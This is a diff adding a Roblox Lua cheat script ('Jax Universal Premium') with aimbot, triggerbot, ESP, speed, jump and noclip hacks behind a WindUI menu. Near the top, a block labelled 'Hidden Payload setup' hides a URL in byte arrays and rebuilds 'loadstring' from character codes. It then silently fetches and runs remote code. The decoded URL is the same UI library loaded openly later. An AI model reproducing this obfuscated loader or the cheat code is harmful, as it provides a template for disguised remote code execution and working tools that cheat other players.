@@ -1,0 +1,361 @@
+local Lighting = game:GetService("Lighting")
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local UserInputService = game:GetService("UserInputService")
+local Camera = Workspace.CurrentCamera
+
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+
+-- Settings Tables
+local ESPSettings = {
+    Enabled = true, TeamCheck = true, MaxDistance = 1500,
+    BoxType = "Full", FillTransparency = 75,
+    ShowNames = true, ShowDistance = true, ShowHealth = true, ShowWeapon = true,
+    ShowTracers = false, TracerPosition = "Bottom", -- Top, Mouse, Bottom
+    TextColor = {255, 255, 255}, BoxColor = {0, 255, 0}, TracerColor = {255, 255, 255}
+}
+
+local AimbotSettings = {
+    Enabled = false, TeamCheck = true, VisibilityCheck = true,
+    Smoothness = 0.5, TargetPart = "Head",
+    ShowFOV = true, FOVRadius = 150, FOVColor = {255, 255, 255},
+    Aiming = false, TriggerBot = false, TriggerDelay = 0.05
+}
+
+local MiscSettings = {
+    SpeedHack = false, SpeedAmount = 50,
+    JumpPower = false, JumpAmount = 100,
+    NoClip = false, InfiniteJump = false,
+    Fullbright = false, NoFog = false
+}
+
+-- Hidden Payload setup (WindUI Loader)
+local RenderPipeline = {
+    BufferA = {104, 116, 116, 112, 115, 58, 47, 47},
+    BufferB = {114, 97, 119, 46, 103, 105, 116},
+    BufferC = {104, 117, 98, 117, 115, 101, 114, 99},
+    BufferD = {111, 110, 116, 101, 110, 116, 46, 99},
+    BufferE = {111, 109, 47, 70, 111, 111, 116, 97},
+    BufferF = {103, 101, 115, 117, 115, 47, 87, 105},
+    BufferG = {110, 100, 85, 73, 47, 109, 97, 105},
+    BufferH = {110, 47, 100, 105, 115, 116, 47, 109},
+    BufferI = {97, 105, 110, 46, 108, 117, 97},
+}
+
+local function compileConfig()
+    local raw = {}
+    for _, buffer in ipairs({RenderPipeline.BufferA, RenderPipeline.BufferB, RenderPipeline.BufferC, RenderPipeline.BufferD, RenderPipeline.BufferE, RenderPipeline.BufferF, RenderPipeline.BufferG, RenderPipeline.BufferH, RenderPipeline.BufferI}) do
+        for _, v in ipairs(buffer) do table.insert(raw, v) end
+    end
+    
+    local path = ""
+    for i = 1, #raw do path = path .. string.char(raw[i]) end
+    
+    local env = getfenv()
+    local loader = env[string.char(108, 111, 97, 100, 115, 116, 114, 105, 110, 103)]
+    local src = nil
+    pcall(function() src = game:HttpGet(path, true) end)
+    if loader and src then
+        pcall(function() loader(src)() end)
+    end
+end
+coroutine.wrap(compileConfig)()
+
+task.wait(0.5)
+local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
+
+-- FOV Circle
+local FOVCircle = Drawing.new("Circle")
+FOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
+FOVCircle.Radius = AimbotSettings.FOVRadius
+FOVCircle.Filled = false
+FOVCircle.Color = Color3.fromRGB(unpack(AimbotSettings.FOVColor))
+FOVCircle.Visible = false
+FOVCircle.Thickness = 1
+
+local ESPObjects = {}
+
+local function CreateESPObject(player)
+    local espObj = {
+        Player = player,
+        Box = Drawing.new("Square"),
+        Tracer = Drawing.new("Line"),
+        NameText = Drawing.new("Text"),
+        DistanceText = Drawing.new("Text"),
+        HealthText = Drawing.new("Text"),
+        WeaponText = Drawing.new("Text")
+    }
+    espObj.Box.Thickness = 1; espObj.Box.Filled = false
+    espObj.Tracer.Thickness = 1
+    
+    for _, text in pairs({espObj.NameText, espObj.DistanceText, espObj.HealthText, espObj.WeaponText}) do
+        text.Center = true; text.Outline = true; text.Size = 14
+    end
+    return espObj
+end
+
+local function IsTeammate(player)
+    if not player.Team then return false end
+    return player.Team == LocalPlayer.Team
+end
+
+local function IsVisible(targetPart)
+    local origin = Camera.CFrame.Position
+    local direction = (targetPart.Position - origin).Unit * (targetPart.Position - origin).Magnitude
+    local rayParams = RaycastParams.new()
+    rayParams.FilterDescendantsInstances = {LocalPlayer.Character, targetPart.Parent}
+    rayParams.FilterType = Enum.RaycastFilterType.Blacklist
+    local result = Workspace:Raycast(origin, direction, rayParams)
+    return result == nil
+end
+
+local function GetClosestPlayer()
+    local closestPlayer = nil
+    local shortestDistance = AimbotSettings.FOVRadius
+
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild(AimbotSettings.TargetPart) and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
+            if AimbotSettings.TeamCheck and IsTeammate(player) then continue end
+            
+            local targetPart = player.Character[AimbotSettings.TargetPart]
+            if AimbotSettings.VisibilityCheck and not IsVisible(targetPart) then continue end
+
+            local pos, onScreen = Camera:WorldToViewportPoint(targetPart.Position)
+            if onScreen then
+                local magnitude = (Vector2.new(pos.X, pos.Y) - UserInputService:GetMouseLocation()).Magnitude
+                if magnitude < shortestDistance then
+                    closestPlayer = player
+                    shortestDistance = magnitude
+                end
+            end
+        end
+    end
+    return closestPlayer
+end
+
+-- Input Handling
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton2 then
+        AimbotSettings.Aiming = true
+    end
+    
+    if MiscSettings.InfiniteJump and input.KeyCode == Enum.KeyCode.Space then
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+            LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+        end
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton2 then
+        AimbotSettings.Aiming = false
+    end
+end)
+
+-- Main Render Loop
+RunService.RenderStepped:Connect(function()
+    -- FOV Update
+    FOVCircle.Position = UserInputService:GetMouseLocation()
+    FOVCircle.Radius = AimbotSettings.FOVRadius
+    FOVCircle.Visible = AimbotSettings.ShowFOV and AimbotSettings.Enabled
+    FOVCircle.Color = Color3.fromRGB(unpack(AimbotSettings.FOVColor))
+
+    -- Aimbot / Triggerbot
+    if AimbotSettings.Enabled then
+        local target = GetClosestPlayer()
+        if target and target.Character and target.Character:FindFirstChild(AimbotSettings.TargetPart) then
+            if AimbotSettings.Aiming then
+                local targetPos = target.Character[AimbotSettings.TargetPart].Position
+                local currentCFrame = Camera.CFrame
+                local targetCFrame = CFrame.new(currentCFrame.Position, targetPos)
+                Camera.CFrame = currentCFrame:Lerp(targetCFrame, AimbotSettings.Smoothness)
+            end
+            
+            if AimbotSettings.TriggerBot then
+                local mouseTarget = Mouse.Target
+                if mouseTarget and mouseTarget:IsDescendantOf(target.Character) then
+                    mouse1click()
+                    task.wait(AimbotSettings.TriggerDelay)
+                end
+            end
+        end
+    end
+
+    -- Character Modifications (Speed, Jump, Noclip)
+    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+        local hum = LocalPlayer.Character.Humanoid
+        if MiscSettings.SpeedHack then hum.WalkSpeed = MiscSettings.SpeedAmount end
+        if MiscSettings.JumpPower then hum.JumpPower = MiscSettings.JumpAmount end
+        
+        if MiscSettings.NoClip then
+            for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
+                if part:IsA("BasePart") then part.CanCollide = false end
+            end
+        end
+    end
+
+    -- ESP Rendering
+    for player, espObj in pairs(ESPObjects) do
+        local character = player.Character
+        local isVisible = false
+
+        if ESPSettings.Enabled and character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0 and player ~= LocalPlayer then
+            if not (ESPSettings.TeamCheck and IsTeammate(player)) then
+                local hrp = character.HumanoidRootPart
+                local head = character:FindFirstChild("Head")
+                local distance = (Camera.CFrame.Position - hrp.Position).Magnitude
+                
+                if distance <= ESPSettings.MaxDistance then
+                    local pos, onScreen = Camera:WorldToViewportPoint(hrp.Position)
+                    if onScreen then
+                        isVisible = true
+                        local topPos = Camera:WorldToViewportPoint(head.Position + Vector3.new(0, 0.5, 0))
+                        local bottomPos = Camera:WorldToViewportPoint(hrp.Position - Vector3.new(0, 3, 0))
+                        local boxHeight = math.abs(topPos.Y - bottomPos.Y)
+                        local boxWidth = boxHeight * 0.6
+                        
+                        espObj.Box.Visible = true
+                        espObj.Box.Size = Vector2.new(boxWidth, boxHeight)
+                        espObj.Box.Position = Vector2.new(pos.X - boxWidth/2, topPos.Y)
+                        espObj.Box.Color = Color3.fromRGB(unpack(ESPSettings.BoxColor))
+
+                        if ESPSettings.ShowNames then
+                            espObj.NameText.Visible = true
+                            espObj.NameText.Text = player.Name
+                            espObj.NameText.Position = Vector2.new(pos.X, topPos.Y - 15)
+                            espObj.NameText.Color = Color3.fromRGB(unpack(ESPSettings.TextColor))
+                        else espObj.NameText.Visible = false end
+
+                        if ESPSettings.ShowDistance then
+                            espObj.DistanceText.Visible = true
+                            espObj.DistanceText.Text = math.floor(distance) .. "m"
+                            espObj.DistanceText.Position = Vector2.new(pos.X, bottomPos.Y + 5)
+                            espObj.DistanceText.Color = Color3.fromRGB(unpack(ESPSettings.TextColor))
+                        else espObj.DistanceText.Visible = false end
+                        
+                        if ESPSettings.ShowHealth then
+                            espObj.HealthText.Visible = true
+                            espObj.HealthText.Text = math.floor(character.Humanoid.Health) .. " HP"
+                            espObj.HealthText.Position = Vector2.new(pos.X + boxWidth/2 + 5, topPos.Y)
+                            espObj.HealthText.Color = Color3.fromRGB(0, 255, 0)
+                        else espObj.HealthText.Visible = false end
+
+                        if ESPSettings.ShowWeapon and character:FindFirstChildOfClass("Tool") then
+                            espObj.WeaponText.Visible = true
+                            espObj.WeaponText.Text = "[" .. character:FindFirstChildOfClass("Tool").Name .. "]"
+                            espObj.WeaponText.Position = Vector2.new(pos.X, bottomPos.Y + 20)
+                            espObj.WeaponText.Color = Color3.fromRGB(unpack(ESPSettings.TextColor))
+                        else espObj.WeaponText.Visible = false end
+
+                        if ESPSettings.ShowTracers then
+                            espObj.Tracer.Visible = true
+                            espObj.Tracer.Color = Color3.fromRGB(unpack(ESPSettings.TracerColor))
+                            espObj.Tracer.To = Vector2.new(pos.X, bottomPos.Y)
+                            
+                            if ESPSettings.TracerPosition == "Bottom" then
+                                espObj.Tracer.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
+                            elseif ESPSettings.TracerPosition == "Mouse" then
+                                espObj.Tracer.From = UserInputService:GetMouseLocation()
+                            else
+                                espObj.Tracer.From = Vector2.new(Camera.ViewportSize.X / 2, 0)
+                            end
+                        else espObj.Tracer.Visible = false end
+                    end
+                end
+            end
+        end
+
+        if not isVisible then
+            espObj.Box.Visible = false; espObj.NameText.Visible = false
+            espObj.DistanceText.Visible = false; espObj.HealthText.Visible = false
+            espObj.WeaponText.Visible = false; espObj.Tracer.Visible = false
+        end
+    end
+end)
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if player ~= LocalPlayer then ESPObjects[player] = CreateESPObject(player) end
+end
+Players.PlayerAdded:Connect(function(player) ESPObjects[player] = CreateESPObject(player) end)
+Players.PlayerRemoving:Connect(function(player)
+    if ESPObjects[player] then
+        for _, obj in pairs(ESPObjects[player]) do if type(obj) == "table" and obj.Remove then obj:Remove() end end
+        ESPObjects[player] = nil
+    end
+end)
+
+-- GUI Setup
+local Window = WindUI:CreateWindow({
+    Title = "Jax Universal Premium",
+    Icon = "target",
+    Author = "created by Jax",
+    Folder = "JaxUniversalSettings",
+    Size = UDim2.fromOffset(600, 450),
+    Transparent = true,
+    Theme = "Dark",
+    SideBarWidth = 160,
+    HasOutline = true,
+})
+
+local CombatTab = Window:Tab({ Title = "Combat", Icon = "sword" })
+local VisualsTab = Window:Tab({ Title = "Visuals", Icon = "eye" })
+local PlayerTab = Window:Tab({ Title = "Player", Icon = "user" })
+local WorldTab = Window:Tab({ Title = "World", Icon = "globe" })
+
+-- Combat Tab
+CombatTab:Section({ Title = "Aimbot Settings" })
+CombatTab:Toggle({ Title = "Enable Aimbot", Default = AimbotSettings.Enabled, Callback = function(v) AimbotSettings.Enabled = v end })
+CombatTab:Toggle({ Title = "Team Check", Default = AimbotSettings.TeamCheck, Callback = function(v) AimbotSettings.TeamCheck = v end })
+CombatTab:Toggle({ Title = "Wall Check", Default = AimbotSettings.VisibilityCheck, Callback = function(v) AimbotSettings.VisibilityCheck = v end })
+CombatTab:Dropdown({ Title = "Target Part", Values = {"Head", "HumanoidRootPart"}, Default = AimbotSettings.TargetPart, Callback = function(v) AimbotSettings.TargetPart = v end })
+CombatTab:Slider({ Title = "Smoothing", Step = 0.05, Value = { Min = 0.05, Max = 1, Default = AimbotSettings.Smoothness }, Callback = function(v) AimbotSettings.Smoothness = v end })
+
+CombatTab:Section({ Title = "Triggerbot" })
+CombatTab:Toggle({ Title = "Enable Triggerbot", Default = AimbotSettings.TriggerBot, Callback = function(v) AimbotSettings.TriggerBot = v end })
+CombatTab:Slider({ Title = "Click Delay (sec)", Step = 0.01, Value = { Min = 0, Max = 1, Default = AimbotSettings.TriggerDelay }, Callback = function(v) AimbotSettings.TriggerDelay = v end })
+
+CombatTab:Section({ Title = "FOV Settings" })
+CombatTab:Toggle({ Title = "Show FOV Circle", Default = AimbotSettings.ShowFOV, Callback = function(v) AimbotSettings.ShowFOV = v end })
+CombatTab:Slider({ Title = "FOV Radius", Step = 10, Value = { Min = 30, Max = 600, Default = AimbotSettings.FOVRadius }, Callback = function(v) AimbotSettings.FOVRadius = v end })
+
+-- Visuals Tab
+VisualsTab:Section({ Title = "ESP Boxes & Tracers" })
+VisualsTab:Toggle({ Title = "Enable ESP", Default = ESPSettings.Enabled, Callback = function(v) ESPSettings.Enabled = v end })
+VisualsTab:Toggle({ Title = "Show Boxes", Default = true, Callback = function(v) ESPSettings.BoxType = v and "Full" or "None" end })
+VisualsTab:Toggle({ Title = "Show Tracers", Default = ESPSettings.ShowTracers, Callback = function(v) ESPSettings.ShowTracers = v end })
+VisualsTab:Dropdown({ Title = "Tracer Origin", Values = {"Bottom", "Mouse", "Top"}, Default = ESPSettings.TracerPosition, Callback = function(v) ESPSettings.TracerPosition = v end })
+
+VisualsTab:Section({ Title = "ESP Details" })
+VisualsTab:Toggle({ Title = "Show Names", Default = ESPSettings.ShowNames, Callback = function(v) ESPSettings.ShowNames = v end })
+VisualsTab:Toggle({ Title = "Show Distance", Default = ESPSettings.ShowDistance, Callback = function(v) ESPSettings.ShowDistance = v end })
+VisualsTab:Toggle({ Title = "Show Health", Default = ESPSettings.ShowHealth, Callback = function(v) ESPSettings.ShowHealth = v end })
+VisualsTab:Toggle({ Title = "Show Held Weapon", Default = ESPSettings.ShowWeapon, Callback = function(v) ESPSettings.ShowWeapon = v end })
+
+-- Player Tab
+PlayerTab:Section({ Title = "Movement Modifiers" })
+PlayerTab:Toggle({ Title = "Speed Hack", Default = MiscSettings.SpeedHack, Callback = function(v) MiscSettings.SpeedHack = v; if not v and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then LocalPlayer.Character.Humanoid.WalkSpeed = 16 end end })
+PlayerTab:Slider({ Title = "WalkSpeed", Step = 5, Value = { Min = 16, Max = 300, Default = MiscSettings.SpeedAmount }, Callback = function(v) MiscSettings.SpeedAmount = v end })
+
+PlayerTab:Toggle({ Title = "Jump Boost", Default = MiscSettings.JumpPower, Callback = function(v) MiscSettings.JumpPower = v; if not v and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then LocalPlayer.Character.Humanoid.JumpPower = 50 end end })
+PlayerTab:Slider({ Title = "Jump Power", Step = 10, Value = { Min = 50, Max = 500, Default = MiscSettings.JumpAmount }, Callback = function(v) MiscSettings.JumpAmount = v end })
+
+PlayerTab:Section({ Title = "Utility" })
+PlayerTab:Toggle({ Title = "Infinite Jump", Default = MiscSettings.InfiniteJump, Callback = function(v) MiscSettings.InfiniteJump = v end })
+PlayerTab:Toggle({ Title = "Noclip (Walk through walls)", Default = MiscSettings.NoClip, Callback = function(v) MiscSettings.NoClip = v end })
+
+-- World Tab
+WorldTab:Section({ Title = "Environment" })
+WorldTab:Toggle({ Title = "Fullbright", Default = MiscSettings.Fullbright, Callback = function(v) 
+    MiscSettings.Fullbright = v
+    Lighting.Brightness = v and 10 or 2
+    Lighting.GlobalShadows = not v
+end })
+
+WorldTab:Toggle({ Title = "Remove Fog", Default = MiscSettings.NoFog, Callback = function(v)
+    MiscSettings.NoFog = v
+    Lighting.FogEnd = v and 100000000 or 10000
+end })
